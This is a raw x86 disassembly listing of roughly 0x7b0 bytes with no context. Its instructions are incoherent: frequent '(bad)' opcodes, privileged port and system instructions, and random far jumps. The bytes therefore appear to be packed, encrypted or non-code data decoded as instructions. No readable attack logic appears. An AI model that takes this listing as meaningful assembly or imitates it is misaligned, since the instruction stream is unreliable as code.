  403105:	call   DWORD PTR [esp+ebp*2+0x6d6f7000]
  40310c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40310d:	mov    al,0x35
  40310f:	jmp    ebx
  403111:	in     eax,0x9d
  403113:	jno    0x4030e5
  403115:	stc    
  403116:	xchg   BYTE PTR [edi+0x2a],dh
  403119:	repz and cl,dh
  40311c:	sbb    BYTE PTR ds:0x8017094b,ch
  403122:	and    ch,BYTE PTR [ebx]
  403124:	call   0x86da:0x1cfb8159
  40312b:	inc    ebp
  40312c:	arpl   WORD PTR [edx+0x42f9df7e],cx
  403132:	and    BYTE PTR [esi],dl
  403134:	push   0x23615600
  403139:	mov    eax,ds:0x9694e461
  40313e:	push   ds
  40313f:	and    BYTE PTR [edx],0x4a
  403142:	cmp    esi,DWORD PTR [eax+0x783e61cc]
  403148:	jns    0x403174
  40314a:	test   BYTE PTR [ecx+0x711ba0f9],bh
  403150:	into   
  403151:	inc    esp
  403152:	jo     0x403180
  403154:	repnz fwait
  403156:	add    al,0xa6
  403158:	fwait
  403159:	mov    bh,0x48
  40315b:	push   cs
  40315c:	cmc    
  40315d:	test   al,0x5f
  40315f:	and    ebx,esi
  403161:	ins    DWORD PTR es:[edi],dx
  403162:	in     al,dx
  403163:	in     eax,0x81
  403165:	inc    edi
  403166:	ficom  DWORD PTR [ebx]
  403168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403169:	cmp    DWORD PTR [edi],esi
  40316b:	sub    esi,eax
  40316d:	xor    eax,0xf680a60
  403172:	mov    ds:0x45b0b16e,al
  403177:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403178:	jne    0x403165
  40317a:	add    al,BYTE PTR [eax+0x3]
  40317d:	mov    al,ds:0x47d03a00
  403182:	mov    ah,0x61
  403184:	out    0xc6,al
  403186:	ret    
  403187:	cs enter 0x34f0,0xf5
  40318c:	les    ebx,FWORD PTR [edi-0x67ec62d5]
  403192:	pushf  
  403193:	fidiv  WORD PTR [ebx+edi*4-0x34]
  403197:	sub    DWORD PTR [ebp+0xaefa1ea],esp
  40319d:	mov    ah,0xd4
  40319f:	hlt    
  4031a0:	pop    edx
  4031a1:	mov    DWORD PTR [eax],edx
  4031a3:	mov    ecx,0x79e2ae34
  4031a8:	mov    DWORD PTR [eax],ecx
  4031aa:	push   ss
  4031ab:	pusha  
  4031ac:	addr16 (bad) 
  4031ae:	xlat   BYTE PTR ds:[ebx]
  4031af:	and    eax,0xc9ef6505
  4031b4:	jbe    0x403180
  4031b6:	pop    eax
  4031b7:	retf   0x47ab
  4031ba:	push   ebp
  4031bb:	inc    ebp
  4031bc:	and    ah,bh
  4031be:	sub    eax,0xa53de396
  4031c3:	mov    BYTE PTR [esi],0xc4
  4031c6:	push   ecx
  4031c7:	pop    esp
  4031c8:	ss dec edi
  4031ca:	aad    0xda
  4031cc:	pop    edi
  4031cd:	shl    BYTE PTR [ebx+eax*8-0x47ff0bcb],0x1
  4031d5:	test   al,0xdc
  4031d7:	cli    
  4031d8:	push   ebx
  4031d9:	out    dx,al
  4031da:	loop   0x40323b
  4031dc:	stc    
  4031dd:	dec    edx
  4031de:	pop    ss
  4031df:	jns    0x403237
  4031e1:	adc    BYTE PTR [eax+0x13e809f8],ah
  4031e7:	imul   eax,DWORD PTR [edi-0x4a],0xffffffd6
  4031eb:	sbb    al,0xd0
  4031ed:	call   0x12325478
  4031f2:	data16 lahf 
  4031f4:	mov    eax,0x16565ca9
  4031f9:	mov    bl,0x4e
  4031fb:	les    ebx,FWORD PTR [esi+edx*8-0x1e]
  4031ff:	stc    
  403200:	es xchg esp,eax
  403202:	ins    BYTE PTR es:[edi],dx
  403203:	pop    ds
  403204:	sbb    al,0x15
  403206:	daa    
  403207:	or     DWORD PTR [edx+0x339bf1a7],0x2e1337eb
  403211:	xchg   ecx,eax
  403212:	pop    esi
  403213:	dec    ecx
  403214:	push   ecx
  403215:	or     BYTE PTR [eax+0x4919ebbd],0x42
  40321c:	int3   
  40321d:	mov    ebx,0x75cecd59
  403222:	int    0xc6
  403224:	aaa    
  403225:	xor    ebp,eax
  403227:	addr16 or ch,0x40
  40322b:	retf   0xfe39
  40322e:	cdq    
  40322f:	adc    eax,0xcec80179
  403234:	mov    edi,0x7f09ac9f
  403239:	popa   
  40323a:	sub    bl,bh
  40323c:	push   eax
  40323d:	fs dec edi
  40323f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403240:	in     al,dx
  403241:	loope  0x403249
  403243:	dec    eax
  403244:	or     al,0xf9
  403246:	cmp    al,0xf8
  403248:	aaa    
  403249:	fcmovnb st,st(5)
  40324b:	add    eax,0x6e27140b
  403250:	and    DWORD PTR [ebp-0x4b43fe8a],ecx
  403256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403257:	into   
  403258:	pop    ebp
  403259:	imul   ecx,edx,0xe2906e4c
  40325f:	cdq    
  403260:	push   edi
  403261:	ret    
  403262:	icebp  
  403263:	push   ds
  403264:	in     eax,dx
  403265:	loopne 0x40329c
  403267:	pop    ebx
  403268:	lock clts 
  40326b:	add    BYTE PTR [ebp-0x77],ch
  40326e:	retf   0x9364
  403271:	pop    ebp
  403272:	pop    eax
  403273:	dec    ecx
  403274:	mov    edx,0xc27dfe8e
  403279:	jle    0x403215
  40327b:	mov    cl,0x78
  40327d:	out    dx,al
  40327e:	xchg   edi,eax
  40327f:	xchg   BYTE PTR [edi],dl
  403281:	xchg   BYTE PTR [edx+0x2cb5c587],ch
  403287:	sar    DWORD PTR [edi+0x50],0x36
  40328b:	outs   dx,DWORD PTR ds:[esi]
  40328c:	scas   al,BYTE PTR es:[edi]
  40328d:	(bad)  
  40328e:	jmp    0x4d13:0x78e0d3c6
  403295:	stos   BYTE PTR es:[edi],al
  403296:	aad    0xb7
  403298:	adc    BYTE PTR [eax+0x61],0xf4
  40329c:	mov    al,0x8d
  40329e:	call   0x31f5:0x214bbae
  4032a5:	or     ch,cl
  4032a7:	ficom  DWORD PTR [ecx]
  4032a9:	fwait
  4032aa:	adc    al,0x99
  4032ac:	popa   
  4032ad:	fprem1 
  4032af:	mov    ah,0x3a
  4032b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032b2:	(bad)  
  4032b3:	fsubr  DWORD PTR [edx-0x5b]
  4032b6:	adc    cl,BYTE PTR [edx+0x39]
  4032b9:	push   edx
  4032ba:	repz cmc 
  4032bc:	sbb    ebx,DWORD PTR [ebx]
  4032be:	adc    bh,bh
  4032c0:	sbb    esi,edi
  4032c2:	sbb    BYTE PTR [ebx+0x4164aa09],cl
  4032c8:	addr16 aad 0x2
  4032cb:	xor    al,0xc7
  4032cd:	and    eax,0xaf53cf89
  4032d2:	mul    DWORD PTR [eax+0x59]
  4032d5:	jecxz  0x40328c
  4032d7:	sub    al,0xc
  4032d9:	and    edi,ebp
  4032db:	inc    BYTE PTR [edi]
  4032dd:	jbe    0x403281
  4032df:	mov    dh,0xe1
  4032e1:	cs inc edi
  4032e3:	sysret 
  4032e5:	sbb    dl,BYTE PTR [edx]
  4032e7:	cs jnp 0x4032c4
  4032ea:	test   DWORD PTR [esi-0x68c06d69],esp
  4032f0:	inc    ebx
  4032f1:	inc    esi
  4032f2:	ror    BYTE PTR [eax-0x3],1
  4032f5:	sti    
  4032f6:	scas   al,BYTE PTR es:[edi]
  4032f7:	push   edi
  4032f8:	and    BYTE PTR [eax],cl
  4032fa:	std    
  4032fb:	fild   DWORD PTR [esp+eiz*4+0xb]
  4032ff:	repnz outs dx,BYTE PTR ds:[esi]
  403301:	(bad)
  403304:	das    
  403305:	or     eax,0xbd6f316b
  40330a:	pop    edi
  40330b:	cmp    DWORD PTR [ebx-0x3fdf7325],0x0
  403312:	in     eax,0x2a
  403314:	inc    edx
  403315:	into   
  403316:	fadd   QWORD PTR [esi+0x75]
  403319:	mov    bl,0xd7
  40331b:	fstp   TBYTE PTR [eax]
  40331d:	lahf   
  40331e:	sbb    BYTE PTR [edi],bh
  403320:	pop    es
  403321:	outs   dx,DWORD PTR ds:[esi]
  403322:	add    al,bh
  403324:	push   ecx
  403325:	inc    DWORD PTR [eax]
  403327:	out    0x35,eax
  403329:	rcl    DWORD PTR [edi+ecx*8],0x2a
  40332d:	add    BYTE PTR [ebx-0x2f],al
  403330:	into   
  403331:	or     eax,0xc29eca4
  403336:	sbb    DWORD PTR [esi+0x6893a025],edx
  40333c:	cld    
  40333d:	pop    esp
  40333e:	sbb    eax,0xdce0be41
  403343:	fiadd  WORD PTR [ebx]
  403345:	sar    ah,1
  403347:	retf   
  403348:	(bad)  
  40334a:	fs sbb al,0x2b
  40334d:	cli    
  40334e:	js     0x4032d6
  403350:	cli    
  403351:	mov    edx,0xf5e2829e
  403356:	push   ss
  403357:	sbb    BYTE PTR [ebp-0x3],al
  40335a:	push   0xffffffe7
  40335c:	and    al,al
  40335e:	ret    0x864a
  403361:	mov    esp,0xbc0faeeb
  403366:	push   esp
  403367:	add    DWORD PTR [esi],ecx
  403369:	sub    cl,ah
  40336b:	es add eax,0xc903ec65
  403371:	nop
  403372:	ss jmp 0x403326
  403375:	mov    esp,0xc5422c94
  40337a:	lods   eax,DWORD PTR ds:[esi]
  40337b:	add    ebp,esi
  40337d:	mov    bh,0xce
  40337f:	popa   
  403380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403381:	push   esp
  403382:	out    0x9a,eax
  403384:	arpl   WORD PTR [esi+0x5d],bx
  403387:	in     al,0x8a
  403389:	xor    edx,DWORD PTR [eax+0x176ac942]
  40338f:	minps  xmm7,XMMWORD PTR [ebx-0x9]
  403393:	lods   eax,DWORD PTR ds:[esi]
  403394:	sub    esp,DWORD PTR [esi+eiz*2-0x50]
  403398:	pop    ebx
  403399:	(bad)  
  40339b:	jge    0x4033f8
  40339d:	arpl   WORD PTR [esi-0x7d],cx
  4033a0:	sub    al,0x33
  4033a2:	cmp    BYTE PTR [edx-0x3f],ah
  4033a5:	adc    eax,0xf22662dc
  4033aa:	popa   
  4033ab:	bound  esi,QWORD PTR [edi]
  4033ad:	push   eax
  4033ae:	in     eax,dx
  4033af:	jae    0x4033bc
  4033b1:	push   cs
  4033b2:	ds jnp 0x403416
  4033b5:	fild   DWORD PTR [esp+ebp*8-0x2c]
  4033b9:	loopne 0x4033b3
  4033bb:	mov    edx,es
  4033bd:	mov    al,0x7a
  4033bf:	fwait
  4033c0:	inc    ebp
  4033c1:	hlt    
  4033c2:	mul    DWORD PTR [eax-0x390e09eb]
  4033c8:	pop    edi
  4033c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4033ca:	ret    
  4033cb:	pop    edi
  4033cc:	lods   al,BYTE PTR ds:[esi]
  4033cd:	mov    ecx,0xa5c78c91
  4033d2:	cdq    
  4033d3:	push   ds
  4033d4:	or     ah,ah
  4033d6:	rcl    DWORD PTR [eax],cl
  4033d8:	in     al,dx
  4033d9:	leave  
  4033da:	sub    cl,BYTE PTR [esi]
  4033dc:	test   BYTE PTR [ecx-0x28],al
  4033df:	(bad)  
  4033e1:	fwait
  4033e2:	adc    al,0xf5
  4033e4:	sbb    DWORD PTR [ecx+ebx*2-0x45],edx
  4033e8:	sar    BYTE PTR [ecx-0x71],0x29
  4033ec:	or     BYTE PTR [ecx-0x5e25e69c],0x97
  4033f3:	(bad)  
  4033f4:	imul   ebp,esi,0x39
  4033f7:	inc    esi
  4033f8:	add    al,0x8
  4033fa:	vandps ymm2,ymm7,YMMWORD PTR [edx-0x58]
  4033ff:	and    edi,DWORD PTR [edi-0x4a623b92]
  403405:	mov    eax,ds:0x70f15661
  40340a:	(bad)  
  40340c:	sub    al,0x23
  40340e:	mov    dl,dl
  403410:	leave  
  403411:	and    DWORD PTR [edx],eax
  403413:	aaa    
  403414:	mov    ds:0x1544f0dc,al
  403419:	lea    ebx,[ecx-0x22]
  40341c:	sub    eax,0xc3c63c8f
  403421:	fs push ecx
  403423:	int    0x40
  403425:	les    edx,FWORD PTR [ebp+esi*4-0x6d]
  403429:	xlat   BYTE PTR ds:[ebx]
  40342a:	mov    esi,0x7f08a2a5
  40342f:	pushf  
  403430:	imul   edi,DWORD PTR ds:[ebx],0xfffffff2
  403434:	mov    edi,0xe958cb
  403439:	push   esi
  40343a:	pop    es
  40343b:	xor    al,0x63
  40343d:	xor    ecx,DWORD PTR [edi]
  40343f:	test   bl,bh
  403441:	int3   
  403442:	xchg   ecx,eax
  403443:	imul   ebx,DWORD PTR [esi],0x60ba19b6
  403449:	lods   al,BYTE PTR ds:[esi]
  40344a:	cmp    al,0x9d
  40344c:	adc    al,BYTE PTR [ecx+0x3d]
  40344f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403450:	sti    
  403451:	lock data16 stc 
  403454:	pushf  
  403455:	mov    ebx,0xc4239ab8
  40345a:	inc    ecx
  40345b:	fidivr WORD PTR [esi-0x71]
  40345e:	movq   mm3,QWORD PTR [eax-0x7]
  403462:	xchg   edi,eax
  403463:	daa    
  403464:	repnz adc edi,DWORD PTR [edi+0x53e7ccd0]
  40346b:	outs   dx,DWORD PTR ds:[esi]
  40346c:	(bad)  
  40346d:	(bad)  
  40346e:	shr    DWORD PTR [esi*4+0x6d53520e],1
  403475:	in     al,0x3a
  403477:	popa   
  403478:	jne    0x4034b4
  40347a:	ins    DWORD PTR es:[edi],dx
  40347b:	jo     0x403454
  40347d:	lock loopne 0x403490
  403480:	ins    DWORD PTR es:[edi],dx
  403481:	cs (bad) 
  403483:	jmp    0x72e3:0x8d6df2b8
  40348a:	fst    DWORD PTR [ebp-0x6efe2e2e]
  403490:	jmp    0x1a19:0x83aae8bf
  403497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403498:	pushf  
  403499:	adc    ah,BYTE PTR [esi]
  40349b:	or     DWORD PTR ds:[ecx-0xb91ee9c],ebx
  4034a2:	xchg   BYTE PTR [esi+0x2d],bh
  4034a5:	adc    al,0xe4
  4034a7:	xor    DWORD PTR [eax+0x546914cb],esp
  4034ad:	pop    ds
  4034ae:	arpl   WORD PTR [edx+0x3e],bx
  4034b1:	mov    bl,0xd7
  4034b3:	hlt    
  4034b4:	jg     0x403463
  4034b6:	ins    DWORD PTR es:[edi],dx
  4034b7:	test   eax,0x95fce718
  4034bc:	mov    ?,WORD PTR [esp+ecx*4]
  4034bf:	push   cs
  4034c0:	push   0xffffffa8
  4034c2:	xchg   BYTE PTR [ecx],bl
  4034c4:	dec    ebx
  4034c5:	jle    0x403459
  4034c7:	out    0xdf,al
  4034c9:	lods   eax,DWORD PTR ds:[esi]
  4034ca:	fwait
  4034cb:	mov    ebp,DWORD PTR [edx-0x74746374]
  4034d1:	les    ebx,FWORD PTR [ecx]
  4034d3:	jl     0x40352c
  4034d5:	mov    ebx,0x77a3db96
  4034da:	push   ebx
  4034db:	xor    DWORD PTR [edx],0x4e
  4034de:	pop    ebx
  4034df:	std    
  4034e0:	sub    BYTE PTR [edx+0x12fa2c39],al
  4034e6:	fdivr  st(1),st
  4034e8:	xor    BYTE PTR [eax+0x55],dl
  4034eb:	add    ah,BYTE PTR [ecx]
  4034ed:	sub    BYTE PTR [eax+0x3309858d],ch
  4034f3:	or     al,0xe
  4034f5:	cmp    DWORD PTR [esi+0x7a],edi
  4034f8:	(bad)  
  4034f9:	imul   esp,DWORD PTR [edx-0x75],0x5ee69143
  403500:	jecxz  0x4034e1
  403502:	ror    DWORD PTR [edx+0x1d181f88],0xd7
  403509:	mov    dl,0x79
  40350b:	sub    BYTE PTR [eax-0x4f],ch
  40350e:	jb     0x40349f
  403510:	pmulhw mm7,QWORD PTR [edi+eiz*8+0x20]
  403515:	das    
  403516:	mul    ecx
  403518:	or     bl,bh
  40351a:	aaa    
  40351b:	push   cs
  40351c:	jbe    0x403502
  40351e:	out    dx,eax
  40351f:	imul   edx,DWORD PTR [ecx],0x566594ba
  403525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403526:	cmp    eax,0x745d7611
  40352b:	pushf  
  40352c:	jnp    0x403530
  40352e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40352f:	aam    0x34
  403531:	loop   0x4034c3
  403533:	dec    ebx
  403534:	dec    eax
  403535:	xor    DWORD PTR [esi-0x2bb75e4c],0xcd13e848
  40353f:	sub    BYTE PTR [esi],ah
  403541:	mov    eax,0xdd8355f
  403546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403547:	and    eax,0x2a517278
  40354c:	inc    ecx
  40354d:	dec    DWORD PTR [edx*4+0x55485df5]
  403554:	test   al,0xba
  403556:	xchg   ebx,eax
  403557:	test   al,0x67
  403559:	jbe    0x4035cd
  40355b:	mov    cl,0xdc
  40355d:	stos   DWORD PTR es:[edi],eax
  40355e:	shr    BYTE PTR [eax],0x7e
  403561:	inc    ecx
  403562:	data16 sbb BYTE PTR [esi-0x76ba562c],cl
  403569:	mov    ss,WORD PTR [eax-0x406cab71]
  40356f:	or     al,0x42
  403571:	mov    fs,edx
  403573:	fdivr  DWORD PTR [si-0x6c]
  403577:	pop    esp
  403578:	or     DWORD PTR [ebx],ebx
  40357a:	or     BYTE PTR [edx+0x1e449921],dl
  403580:	push   ds
  403581:	jl     0x40352a
  403583:	ficom  DWORD PTR [ecx]
  403585:	and    ch,BYTE PTR [ecx+0x42]
  403588:	sub    DWORD PTR [esi-0x6576aab0],ebp
  40358e:	loop   0x40353c
  403590:	mov    BYTE PTR [edx+0x2538c35a],dl
  403596:	retf   0x72a5
  403599:	out    dx,eax
  40359a:	pop    ebx
  40359b:	sbb    BYTE PTR [ebx-0x4d626f61],ah
  4035a1:	add    eax,0x91f0795f
  4035a6:	fwait
  4035a7:	sahf   
  4035a8:	or     DWORD PTR ds:0x8908e844,esp
  4035ae:	mov    al,ds:0x69b17caf
  4035b3:	lock mov dh,0xd3
  4035b6:	adc    ebx,esp
  4035b8:	les    ebx,FWORD PTR [ebx-0x5d]
  4035bb:	mov    dl,0xdc
  4035bd:	pop    ecx
  4035be:	adc    al,0x81
  4035c0:	imul   esi,DWORD PTR [ebx],0xdd58d36c
  4035c6:	pop    es
  4035c7:	jle    0x4035e6
  4035c9:	sbb    eax,0x27ddba6c
  4035ce:	mov    cl,0xe4
  4035d0:	imul   ecx,esp,0xffffffdb
  4035d3:	mov    dl,0x3d
  4035d5:	mov    edi,0xbaa803dc
  4035da:	pop    edx
  4035db:	ret    0x4739
  4035de:	mov    ah,BYTE PTR [edi-0x23]
  4035e1:	lds    edx,FWORD PTR [ebx-0x210d02aa]
  4035e7:	es (bad) 
  4035e9:	sub    eax,0xb145fe69
  4035ee:	std    
  4035ef:	fidiv  WORD PTR [ecx]
  4035f1:	ficom  DWORD PTR [edi-0x537ea840]
  4035f7:	jb     0x40362a
  4035f9:	or     eax,0x685d3891
  4035fe:	dec    edi
  4035ff:	js     0x4035ca
  403601:	mov    eax,0x16e421c8
  403606:	or     BYTE PTR fs:[ecx],bl
  403609:	fnstenv [esi+0x1b230148]
  40360f:	sub    ecx,ebp
  403611:	fcmovbe st,st(7)
  403613:	jl     0x4035e9
  403615:	or     BYTE PTR [edi],dh
  403617:	loop   0x40359c
  403619:	add    edx,DWORD PTR [ebp+0x60]
  40361c:	cmp    ebx,edi
  40361e:	ror    BYTE PTR [ecx+0x62],0x15
  403622:	xchg   dl,ah
  403624:	fwait
  403625:	xchg   DWORD PTR [ecx+0x3500d182],ebx
  40362b:	pop    ecx
  40362c:	mov    ds:0x99dd24f9,al
  403631:	inc    esi
  403632:	jmp    0xab75:0xa190e58a
  403639:	xchg   DWORD PTR [ecx+eiz*4-0x52f2aef5],ebp
  403640:	mov    DWORD PTR [edx+0x54],ecx
  403643:	lods   al,BYTE PTR ds:[esi]
  403644:	retf   0x8704
  403647:	mov    dl,0x7a
  403649:	or     DWORD PTR [edi],edx
  40364b:	pop    esp
  40364c:	adc    al,0xdd
  40364e:	(bad)  
  40364f:	sbb    DWORD PTR [ecx+ebx*1],esp
  403652:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403653:	inc    ecx
  403654:	inc    ebx
  403655:	push   ss
  403656:	popa   
  403657:	clc    
  403658:	mov    bh,0x1c
  40365a:	mov    al,0xed
  40365c:	cmp    dh,ch
  40365e:	rcl    bl,0x59
  403661:	xor    ebx,DWORD PTR [esi+ecx*4+0x26bb036]
  403668:	pop    edi
  403669:	fnstsw WORD PTR [ebx]
  40366b:	push   edi
  40366c:	in     eax,0xd8
  40366e:	xchg   DWORD PTR [esi],esp
  403670:	mov    dh,0x8
  403672:	call   0x1278:0x63b3f200
  403679:	xor    bh,BYTE PTR [ecx+0x5]
  40367c:	or     eax,0x1d4fa94f
  403681:	cmp    BYTE PTR [edx+0x9],dh
  403684:	add    eax,DWORD PTR [ecx+edx*2]
  403687:	data16 and BYTE PTR [eax+eax*2+0x37cd21b1],ch
  40368f:	adc    edx,DWORD PTR [ecx]
  403691:	leave  
  403692:	sar    esp,cl
  403694:	inc    ebp
  403695:	pop    esi
  403696:	repz pusha 
  403698:	sti    
  403699:	or     edx,esi
  40369b:	aaa    
  40369c:	pop    ss
  40369d:	jle    0x40371a
  40369f:	push   edx
  4036a0:	sbb    al,0xff
  4036a2:	mov    edx,0xde4691ac
  4036a7:	or     esi,DWORD PTR [eax-0x4d98f977]
  4036ad:	shl    BYTE PTR [esi+edi*4+0xbb522b6],0x96
  4036b5:	add    esi,DWORD PTR [ecx-0x38eb57ef]
  4036bb:	fcmovnu st,st(7)
  4036bd:	xlat   BYTE PTR ds:[ebx]
  4036be:	outs   dx,DWORD PTR ds:[esi]
  4036bf:	fild   WORD PTR ds:0xcce0801b
  4036c5:	test   bl,0xb2
  4036c8:	mul    BYTE PTR [ebx]
  4036ca:	popa   
  4036cb:	pusha  
  4036cc:	jns    0x403727
  4036ce:	push   edx
  4036cf:	xchg   esp,eax
  4036d0:	inc    ebx
  4036d1:	push   esp
  4036d2:	repz add BYTE PTR [eax-0x78],cl
  4036d6:	gs in  al,dx
  4036d8:	add    ch,BYTE PTR cs:[esi-0x6f]
  4036dc:	dec    esi
  4036dd:	mov    al,ds:0x351fdfb8
  4036e2:	out    dx,al
  4036e3:	sub    eax,0xb05f7973
  4036e8:	mov    ah,0xa2
  4036ea:	lods   eax,DWORD PTR ds:[esi]
  4036eb:	add    al,bl
  4036ed:	mov    bh,0x7
  4036ef:	mov    ?,WORD PTR [edi]
  4036f1:	loopne 0x4036be
  4036f3:	retf   
  4036f4:	mov    bh,0x80
  4036f6:	sahf   
  4036f7:	dec    esp
  4036f8:	pop    edx
  4036f9:	mov    BYTE PTR [ebp-0x2],dh
  4036fc:	mov    esp,0x6039591
  403701:	mov    dh,0x6c
  403703:	pop    eax
  403704:	mov    dl,0x1c
  403706:	imul   ebp,DWORD PTR [ebx-0x3d656f29],0x909f9ec5
  403710:	dec    ecx
  403711:	xchg   edx,eax
  403712:	shl    BYTE PTR [edi+eiz*2],cl
  403715:	ss mov es,ebx
  403718:	cmp    DWORD PTR [esi-0x15f725df],0x18213c8a
  403722:	stos   BYTE PTR es:[edi],al
  403723:	and    ch,BYTE PTR ds:0xdbe07427
  403729:	repnz add cl,BYTE PTR [edx-0x40]
  40372d:	js     0x40373b
  40372f:	(bad)  [esi]
  403731:	sbb    eax,0x26f623bf
  403736:	das    
  403737:	pop    ds
  403738:	(bad)  
  403739:	stos   BYTE PTR es:[edi],al
  40373a:	in     al,dx
  40373b:	rcr    edx,1
  40373d:	push   ecx
  40373e:	imul   BYTE PTR [ebx]
  403740:	sub    al,0x5a
  403742:	mov    edx,0x1e6f40d
  403747:	pop    esp
  403748:	and    ecx,DWORD PTR [edx-0x2f]
  40374b:	(bad)  
  40374c:	push   ds
  40374d:	jns    0x403705
  40374f:	adc    bl,dl
  403751:	pop    ecx
  403752:	cmc    
  403753:	dec    edx
  403754:	gs sub edi,ebx
  403757:	jno    0x40370b
  403759:	mov    bl,0x53
  40375b:	adc    DWORD PTR [ebp+0x70],ebp
  40375e:	xor    esp,esp
  403760:	inc    esi
  403761:	ds jecxz 0x4036eb
  403764:	ret    
  403765:	adc    al,0x41
  403767:	and    BYTE PTR [ecx+edx*2+0xd],cl
  40376b:	sub    BYTE PTR [esi+0x4c],dh
  40376e:	mov    bl,0xc8
  403770:	mov    bh,0x58
  403772:	adc    BYTE PTR [ecx+0x13],ah
  403775:	idiv   BYTE PTR ds:0xbd0e9812
  40377b:	outs   dx,DWORD PTR ds:[esi]
  40377c:	add    BYTE PTR [esi+0x6d4ff1da],ch
  403782:	aam    0xd9
  403784:	dec    edx
  403785:	iret   
  403786:	mov    edx,DWORD PTR [ecx-0x16]
  403789:	sub    BYTE PTR [edx-0xa8a4545],dl
  40378f:	addr16 aas 
  403791:	push   edi
  403792:	push   0xffffffe5
  403794:	push   es
  403795:	les    ecx,FWORD PTR [esi]
  403797:	dec    edx
  403798:	push   eax
  403799:	(bad)  
  40379a:	xchg   ecx,eax
  40379b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40379d:	inc    eax
  40379e:	rcl    cl,cl
  4037a0:	jg     0x403738
  4037a2:	push   cs
  4037a3:	jnp    0x403786
  4037a5:	leave  
  4037a6:	add    al,0x2f
  4037a8:	int3   
  4037a9:	and    DWORD PTR [eax],esi
  4037ab:	aam    0x8b
  4037ad:	cdq    
  4037ae:	inc    esp
  4037af:	adc    eax,0x13495fdc
  4037b4:	gs scas al,BYTE PTR es:[edi]
  4037b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037b7:	jmp    0xe6a45e43
  4037bc:	adc    BYTE PTR ds:0x20a08e97,ch
  4037c2:	jecxz  0x4037fd
  4037c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037c5:	xor    BYTE PTR [ecx+0x72],cl
  4037c8:	mov    esp,0x25372cc8
  4037cd:	cmp    DWORD PTR [bx+0x3a1d],esi
  4037d2:	dec    esp
  4037d3:	add    al,0x7f
  4037d5:	jne    0x4037b7
  4037d7:	sahf   
  4037d8:	add    eax,0xeba9c40b
  4037dd:	adc    ebx,eax
  4037df:	jecxz  0x4037cd
  4037e1:	fiadd  WORD PTR [ecx-0x7d]
  4037e4:	xlat   BYTE PTR ds:[ebx]
  4037e5:	add    DWORD PTR [esi],esp
  4037e7:	mov    ?,WORD PTR [ebx]
  4037e9:	jle    0x4037eb
  4037eb:	push   edx
  4037ec:	adc    DWORD PTR [edi],0x40
  4037ef:	xlat   BYTE PTR ds:[ebx]
  4037f0:	mov    cl,0xe8
  4037f2:	cld    
  4037f3:	inc    esi
  4037f4:	shr    DWORD PTR [ebx+0x129e4fb8],1
  4037fa:	aad    0x6a
  4037fc:	loope  0x40384c
  4037fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4037ff:	and    eax,0x795b4bb3
  403804:	bound  ebp,QWORD PTR [ebx]
  403806:	out    0xdc,eax
  403808:	ds je  0x40386d
  40380b:	jmp    0x403872
  40380d:	ins    DWORD PTR es:[edi],dx
  40380e:	push   es
  40380f:	fist   WORD PTR [eax-0x4e9698e6]
  403815:	fadd   DWORD PTR [esi+0x7436926d]
  40381b:	jle    0x403871
  40381d:	jb     0x4037ef
  40381f:	bnd repz js 0x40386e
  403823:	push   ds
  403824:	pusha  
  403825:	scas   al,BYTE PTR es:[edi]
  403826:	in     eax,0xb2
  403828:	sbb    esi,DWORD PTR [edx+edx*4-0x7f]
  40382c:	sbb    ebp,0xffffffca
  40382f:	push   0x1d
  403831:	(bad)  
  403833:	aad    0xef
  403835:	fimul  DWORD PTR [edi+0x6e2dfe22]
  40383b:	jns    0x403879
  40383d:	(bad)  
  40383e:	or     ebx,DWORD PTR gs:[bx]
  403842:	xor    eax,0x516987d0
  403847:	inc    ecx
  403848:	imul   ebx,edx,0x57605396
  40384e:	sti    
  40384f:	push   ebx
  403850:	sub    al,0xd6
  403852:	les    esp,FWORD PTR [esi]
  403854:	retf   0x7289
  403857:	cld    
  403858:	retf   
  403859:	dec    edx
  40385a:	aad    0x7d
  40385c:	jnp    0x4038b3
  40385e:	cmp    DWORD PTR [ecx+0x4b],eax
  403861:	repz fistp DWORD PTR [esi+ecx*8-0x65]
  403866:	adc    DWORD PTR [ebp-0x3f],ebp
  403869:	shr    BYTE PTR [ecx+0x20],0x48
  40386d:	jo     0x4038b6
  40386f:	dec    eax
  403870:	push   edx
  403871:	jecxz  0x403808
  403873:	cmp    DWORD PTR [eax-0x2d],ebp
  403876:	cmp    eax,0x713edfec
  40387b:	mov    fs,edx
  40387d:	rcr    DWORD PTR [ebp-0x79],cl
  403880:	add    DWORD PTR [edx-0x684c4a14],ecx
  403886:	fcmovb st,st(7)
  403888:	dec    esi
  403889:	dec    esp
  40388a:	stos   DWORD PTR es:[edi],eax
  40388b:	stc    
  40388c:	adc    al,bl
  40388e:	jo     0x403877
  403890:	xchg   esi,eax
  403891:	cs in  eax,dx
  403893:	out    0x3c,al
  403895:	btr    ecx,ebx
  403898:	nop
  403899:	mov    ds:0xf8fbf18a,eax
  40389e:	fmulp  st(5),st
  4038a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038a1:	and    bh,BYTE PTR [ebx-0xb259375]
  4038a7:	rcr    esi,1
  4038a9:	outs   dx,BYTE PTR ds:[esi]
  4038aa:	xchg   edi,eax
  4038ab:	push   ds
  4038ac:	in     al,dx
  4038ad:	int3   
  4038ae:	jae    0x40392d
  4038b0:	pop    es
  4038b1:	pop    es
  4038b2:	push   0xffde3948
  4038b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038b8:	mov    ecx,0x38b22b71
